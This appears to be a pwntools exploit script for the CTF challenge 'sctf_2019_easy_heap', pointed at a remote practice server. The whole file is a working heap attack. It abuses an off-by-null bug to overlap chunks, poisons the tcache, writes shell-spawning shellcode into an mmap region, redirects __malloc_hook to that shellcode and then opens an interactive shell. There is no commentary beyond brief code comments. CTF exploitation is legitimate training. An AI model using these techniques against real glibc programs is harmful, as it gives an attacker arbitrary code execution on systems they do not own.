from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./sctf_2019_easy_heap"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 26659)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size):
    sla(">> ", "1")
    sla("Size: ", str(size))
    rud("Pointer Address ")
    info = int(rud("\n"), 16)
    print("addr: ", hex(info))

    return info 

def free(index):
    sla(">> ", "2")
    sla("Index: ", str(index))

def edit(index, con):
    sla(">> ", "3")
    sla("Index: ", str(index))
    sa("Content: ", con)


# off by null

# use shellcode to get shell
context(os="linux", arch="amd64")
code = asm(shellcraft.sh())
print("code len: ", hex(len(code)))

# get shellcode mem addr 
rud("Mmap: ")
code_addr = int(rud("\n"), 16)
print("code_addr: ", hex(code_addr))

# chunk overlap
add(0x410)  # 0
add(0x68)   # 1
add(0x18)   # 2
add(0x4f0)  # 3
add(0x10)   # 4
free(0)
edit(2, cyclic(0x10)+p64(0x70+0x20+0x420))
free(3)

# make tcache bin
free(1)  # 0x70
free(2)  # 0x20

# alloc to code_addr
add(0x420+0x60)  # 0
edit(0, cyclic(0x410)+p64(0)+p64(0x71)+p64(code_addr)+b"\n")
add(0x68)   # 1
add(0x68)   # 2
edit(2, code+b"\n")  # write shellcode

# alloc to malloc hook
add(0x510)  # 3
edit(3, b"\x30"+b"\n")
add(0x10)   # 5
add(0x10)   # 6
edit(6, p64(code_addr)+b"\n")  # alter malloc_hook to code_addr

# attack
sla(">> ", "1")
sla("Size: ", str(0x20))

shell()


